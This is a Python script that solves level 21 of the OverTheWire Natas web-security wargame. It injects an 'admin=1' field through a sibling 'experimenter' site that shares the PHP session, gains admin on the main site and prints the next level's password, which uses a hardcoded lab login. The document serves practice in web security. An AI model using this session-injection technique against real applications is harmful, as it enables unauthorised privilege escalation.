# Natas21 python solution
# By Emil 'Dota' Bak, 2019

import requests

# ***********************************************
URL     = "http://natas21.natas.labs.overthewire.org/"
URL_css = "http://natas21-experimenter.natas.labs.overthewire.org/"

auth_name = 'natas21'
auth_pass = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# By connecting to the challenge, a Cookie is set.
r = s.get(URL)
COOKIES = dict(PHPSESSID=r.cookies['PHPSESSID'])

# By viewing the source-code, it can be noted that it is
# possible to inject the 'admin' value via the options from
# the adjacent site, 'natas21-experimenter'.

# Injection + passing on the cookies/sessionID
DATA  = dict(align="nope", fontsize="100", bgcolor="blue", admin="1", submit="Update")
r_css = s.post(URL_css, data=DATA, cookies=COOKIES)

r = s.post(URL, cookies=COOKIES)

for x in r.iter_lines():
    if "Password" in x:
        print x[:-6]